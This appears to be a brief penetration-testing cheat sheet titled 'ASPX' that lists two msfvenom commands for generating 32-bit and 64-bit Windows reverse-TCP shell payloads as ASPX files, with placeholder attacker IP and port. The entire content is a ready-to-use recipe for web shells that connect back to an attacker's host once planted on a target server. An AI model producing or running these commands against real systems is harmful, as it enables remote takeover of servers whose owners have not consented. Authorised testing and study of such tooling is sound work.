# ASPX

1. x86 (32-bit) Payloads

`$ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x86.aspx`

2. x86_64 (64-bit) Payloads

`$ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x64.aspx`